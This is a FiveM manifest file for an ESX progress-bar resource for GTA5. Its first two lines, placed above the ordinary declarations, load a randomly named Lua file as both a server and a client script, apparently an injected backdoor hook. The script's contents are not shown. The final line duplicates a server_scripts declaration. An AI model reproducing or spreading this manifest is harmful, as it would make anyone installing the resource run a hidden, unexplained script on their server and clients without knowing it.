server_script "QWI2I11ZU6.lua"
client_script "QWI2I11ZU6.lua"
fx_version 'adamant'
game 'gta5'
author 'ESX-Framework'
lua54 'yes'
version '1.9.4'
description 'ESX Progressbar'

client_scripts { 'Progress.lua' }
shared_script '@es_extended/imports.lua'
ui_page 'nui/index.html'

files {
    'nui/index.html',
    'nui/js/*.js',
    'nui/css/*.css',
}
server_scripts { '@mysql-async/lib/MySQL.lua' }server_scripts { '@mysql-async/lib/MySQL.lua' }